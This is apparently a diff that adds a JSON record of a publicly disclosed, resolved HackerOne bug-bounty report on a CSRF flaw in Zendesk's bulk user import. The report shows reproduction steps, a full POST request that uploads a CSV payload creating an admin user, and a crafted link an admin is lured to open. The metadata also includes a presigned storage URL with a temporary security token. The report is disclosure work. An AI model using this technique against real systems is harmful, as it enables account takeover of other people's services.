@@ -1,0 +1,115 @@
+{
+  "id": 102194,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDIxOTQ=",
+  "url": "https://hackerone.com/reports/102194",
+  "title": "[CRITICAL] CSRF leading to account take over",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2015-11-26T16:07:35.352Z",
+  "submitted_at": "2015-11-26T16:07:35.352Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "zombiehelp54",
+    "url": "/zombiehelp54",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/mevfgipw1pc7n4wy86swdq1yaeuq/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 205,
+    "url": "https://hackerone.com/zendesk",
+    "handle": "zendesk",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/205/1f7838d9b4201d122e0a7fbacc8ff3e90f57fa0c_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/205/1f7838d9b4201d122e0a7fbacc8ff3e90f57fa0c_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Zendesk",
+      "twitter_handle": "",
+      "website": "https://www.zendesk.com",
+      "about": "Zendesk is a leading cloud-based customer service software solution. Over 100,000 customer accounts use Zendesk to increase customer satisfaction."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2016-04-04T21:48:40.130Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-01-16T19:29:43.481Z",
+  "team_member_agreed_on_going_public_at": "2016-04-04T21:48:39.649Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi , I have found a CSRF issue in `<your_zebdesk>.zendesk.com/jobs/createjob` that leads to full account take over.\n#Details: \nWhen using bulk user import in `https://<your_zendesk>.zendesk.com/import?kind=user` after you upload a CSV file and press import , a request is sent to `https://<your_zendesk>.zendesk.com/jobs/createjob?[password_email_change_csv_import]=true&job[token]=IozGNzPJIR1AniyrlueEIkLL8&job[update_records]=true&return_to=/people&type=user_import`. \nif you look at the request you'll see that the only token sent in the request is the `job[token]` value , so I have tried to change the url to `https://<victim_account>.zendesk.com/jobs/createjob?[password_email_change_csv_import]=true&job[token]=IozGNzPJIR1AniyrlueEIkLL8&job[update_records]=true&return_to=/people&type=user_import` , but the import failed and I received an email saying that there was an error when importing the users , but the error gave me a hint , This was the email: \n```\nFor some reason the data to import was not ready in our servers. Try again.\n\nWe've been notified about this and will solve the problem if there's a bug. If the error persists, please contact our support team. The error was:\n\nundefined method `attachments' for nil:NilClass\n```\nas you can see the error gives a hint that the `job[token]` parameter value is an id of the uploaded CSV file which can only be generated when uploading the csv file in the bulk user import page. \nBut , wait a second , it says `attachments` which mean it's actually an id of an attachment , so if the attacker signed up as an end user account and tried to submit a ticket then uploaded his csv file as an attachment and got the file id and replaced it with the `job[token]` parameter value , so the link will look like : \n`https://<victim_account>.zendesk.com/jobs/createjob?[password_email_change_csv_import]=true&job[token]=<uploaded_file_id>&job[update_records]=true&return_to=/people&type=user_import`, it will work and if the attacker sent that link to an admin user and the admin visited it , a user with admin privileges will be added!\n\n#Steps to reproduce:\n1. Login to your zendesk account as an end-user \n2.  Send this POST request through the end user:\n\n```\n POST https://<account>.zendesk.com/hc/en-us/request_uploads\nHost: sad69.zendesk.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:33.0) Gecko/20100101 Firefox/33.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-CSRF-Token: KVUlCzxLTdJRkLuZrsGoYMNWgaL56Y3Rg3SwX6DyuMi7UkWo7pEV2I7auJVAmD8k+KKo6d5o0wsouRjzWwsvWQ==\nX-Requested-With: XMLHttpRequest\nReferer: https://sad69.zendesk.com/hc/en-us/requests/new\nContent-Length: 557\nContent-Type: multipart/form-data; boundary=---------------------------3915858413600\nCookie: <session_cookies>\nConnection: keep-alive\nPragma: no-cache\nCache-Control: no-cache\n\n\n-----------------------------3915858413600\nContent-Disposition: form-data; name=\"authenticity_token\"\n\n<your_token>\n-----------------------------3915858413600\nContent-Disposition: form-data; name=\"file\"; filename=\"csv.csv\"\nContent-Type: application/vnd.ms-excel\n\n\"name\",\"email\",\"external_id\",\"details\",\"notes\",\"phone\",\"role\",\n\"restriction\",\"organization\",\"tags\"\nHacker,\"attacker@example.com\",,,,,\"admin\",\"This is a hacker\",,\n-----------------------------3915858413600--\n```\n\n3- Now get the response of the request then get the `ID` of the uploaded file , which will look like this `dwYMJH6N8QloZt7lFJeZ9bN26` (Please note that the id is not the attachment token)\n4- After that logout from the end user account then login with the account owner account and go to:\n\n```\nhttps://<account>.zendesk.com/jobs/create?job[password_email_change_csv_import]=true&job[token]=<uploaded_file_id>&job[update_records]=true&return_to=/people&type=user_import\n```\n5- Go to the agent email and you'll see an email saying that user import successfully completed , also you can verify by going to `https://<your_account>.zendesk.com/users` and you'll see that an admin named **Hacker** Was added. \n\nI will attach the CSV file for importing the user , just in case you are having a trouble sending the request in step 2. \n\nThanks. \n\n",
+  "weakness": {
+    "id": 45,
+    "name": "Cross-Site Request Forgery (CSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 63561,
+      "file_name": "csv.csv",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/063/561/b139ee08a0f16cd7b586e1ca79b831eda46c8ed8/csv.csv?response-content-disposition=attachment%3B%20filename%3D%22csv.csv%22%3B%20filename%2A%3DUTF-8%27%27csv.csv&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2MPOSDGS%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T115048Z&X-Amz-Expires=2102&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCBbMU%2B267qveSZjBTX7ems7plNjeRB6ghD4pLJYoxoNQIhAOB1OSi6O%2Fdo0XBpeF6JncYBFY%2B3LuUhN87iPIpANtG6KrIFCG8QAxoMMDEzNjE5Mjc0ODQ5IgyTVupFrPXFhTCscDcqjwX3tBGrIxV1zh7UC%2F4Jr3riyPw49dAeC5kRAlOtteJbZE7w38%2Bz4nQNyxwc0EDGaQF7ShQBfd%2BZUHPanKu9xreSHilAC48s6ipy0W6liWIA716VdwLzxs61TAwjVY5Dn5NcJX6Q3ESCcUgNOvCDp5WtNJIC8hjUvq%2FIfZNGgSU8EEE3ZhddGlH637YMsQmHoURN7ZdlmqOjTdTjp1ZmGwSf4gfCfxcBa7RWhKXxfMjNXP9W%2B7Q4lzx9iyRB9bAKQ4vzqfzKuIzUvErDi7g1BejVCAMSpc3neh6LHUPLL09kycCd7wAIkU7M%2B1YSEpwoAGZjPw1YxjIXbkUjkViJH7tHQuO4Y2MDuCX9kPdXFdl1iTN%2BQFQHzJUlJnpzreuX8gCvgxp69xs2UrjoNcSh%2FutYkUp8hxyzddNzX4DncxeeiM5bDDyE%2FiM9XoHAfxZIZotmhUdHCXdIwfJOxL0rm9j1SkozgxU5pKQ%2FMqFAw9ktT4uCJOpF4hQqSIO3Al5aEOuHYpsL%2FvTUa0CWR23BN5Oso%2FwqP4o%2BpqfE5SGocS58oIvDbg%2BUSZgbOd%2FASTpH0%2BdbT75BjpWMniqmLAdLfz%2B9HoKI4%2B%2Bu1VE9nn3tEdJdpoT8plVaCnWqo6gsxkH1xRgD3LIQnGiOB3VBJMae5D%2B3SINIj%2F02Ts9Sk9HfzDcHasyi33Rbfa2Z6Cybqm9RjGjM9NZxVc6VNJAbR65Dz9a86PbI1BXTro4UwUsRNpwkFO2dAcHb8%2BKZBxPXEAHTC%2BofM5%2BCgN25GFIFvtqv6dqg7qhR09%2B2yIbEFl3Jl0CO2tqOCuUg8fXONobnIcyzyJ5drnRry8Hja0ZBfbS5kAfZw6b00jsYTbyK27fWrclbMLiSrK4GOrABSlUIRQH7wV3jiBwm%2BeWqVFr0C9fXdkEWssmuTS38vAJfNkTBbi3JGXNRIeiEwLy8Ure25FlVwG2TP52pXfh0Nc96Cu8PlYAOMCGlg2RvQKToTUDyNjN%2FvhVk%2B2ldWDLLFAMrKgMam5Gdy5PJO6eVDmNGMuI5wUXvzyUPjR9cvsWGe75MDpFAn9K8YC%2FVr8w8lUemxqjYZSER8ZFwYOVS4G6%2BJQ0efx3tmFba4J9Wekc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0cd8d88e61c6e4ba923d69522a36bad934b820fee8e0e18bc9c12af3718a4408",
+      "file_size": 163,
+      "type": "text/plain",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2016-02-15T19:29:43.728Z",
+  "allow_singular_disclosure_after": -252260464.37693965,
+  "singular_disclosure_allowed": true,
+  "vote_count": 6,
+  "voters": [
+    "bogdantcaciuc",
+    "sodium_",
+    "t4ym",
+    "shivammusic",
+    "spetr0x",
+    "dyabla"
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
